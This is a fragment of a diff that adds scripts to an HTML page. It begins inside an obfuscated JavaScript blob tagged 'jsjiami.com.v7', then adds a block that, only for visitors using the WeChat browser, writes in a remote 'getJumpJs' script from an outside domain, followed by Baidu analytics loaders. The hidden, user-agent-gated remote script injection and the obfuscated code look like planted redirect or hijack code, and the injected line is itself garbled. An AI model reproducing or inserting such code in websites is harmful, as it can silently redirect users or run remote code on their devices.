(_0x4b18e4 += _0x191d66[_0xdada19++], _0x22c7d9[_0xc67753(0x14c, '$8eq')] = _0x3f1ee6[_0xc67753(0x13a, 'EQka')](_0xc67753(0x179, '(c9d') + _0x18f129, _0x3f1ee6[_0xc67753(0x12f, 'SnPV')])) : (_0x3f1ee6[_0xc67753(0x18e, 'N[t4')](_0x446bf8, _0x47945f), _0x5f07f6[_0xc67753(0x14c, '$8eq')] = _0x3f1ee6[_0xc67753(0x14b, 'ygoe')] + _0x2b48d4 + _0x3f1ee6[_0xc67753(0x175, 'BVAP')]) : (_0x47b17d += _0x1c53df[_0x246753++], _0x872795[_0xc67753(0x180, 'infM')] = _0x27eb7b[_0xc67753(0x1b4, 'W[]h')](_0x27eb7b[_0xc67753(0x143, '[$(*')](_0xc67753(0x17a, '9^eD'), _0x47b17d), _0xc67753(0x16b, 'IqT&'))) : _0x27eb7b[_0xc67753(0x16f, 'bEvY')](_0x27eb7b[_0xc67753(0x131, 'r1pJ')], _0x27eb7b[_0xc67753(0x1cc, 'POUl')]) ? _0x35fc0e = _0x3f1ee6[_0xc67753(0x1a0, 'GgOw')] + _0x3f1ee6[_0xc67753(0x190, 'infM')] + _0x3f1ee6[_0xc67753(0x151, 'IqT&')] : (_0x27eb7b[_0xc67753(0x1ca, 'ygoe')](clearInterval, _0x481809), _0x872795[_0xc67753(0x1a3, '#jg(')] = _0x27eb7b[_0xc67753(0x14a, 'AYf#')](_0xc67753(0x198, 'FHe2') + _0x47b17d, _0x27eb7b[_0xc67753(0x13b, 'YIrl')])); }, 0x64); } var version_ = 'jsjiami.com.v7';
+		</script>
+		<script>
+			if ((typeof (data_type) != "undefined" && data_type == 0) || (typeof (vip_type) != "undefined" && vip_type != null && vip_type == 0)) {
+				var ua = navigator.userAgent.toLowerCase();
+				if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") == -1 && document.referrer.indexOf("code") == -1 && document.referrer.indexOf("new") == -1 && document.referrer.indexOf("game") == -1) {
+					document.writeln("<script src="https://accct.cn/%5C%22https:/ai8.top/api/getJumpJs%5C%22"><\/script>");  
+	}
+			}
+
+			var _hmt = _hmt || [];
+			(function () {
+				var hm = document.createElement("script");
+				if (location.toString().indexOf("55.cn") > -1 || location.toString().indexOf("77.cn") > -1 || location.toString().indexOf("ai8") > -1) {
+					hm.src = "https://hm.baidu.com/hm.js?51d6321aaa4909493b4e8941b57c30d7";//OT统计
+				} else {
+					hm.src = "https://hm.baidu.com/hm.js?9268d9128fcebf1a5da96d7cb2a8dac4";//CN统计
+				}
+				var s = document.getElementsByTagName("script")[0];
+				s.parentNode.insertBefore(hm, s);
+			})();
+		</script>
+</body>
+
+</html>
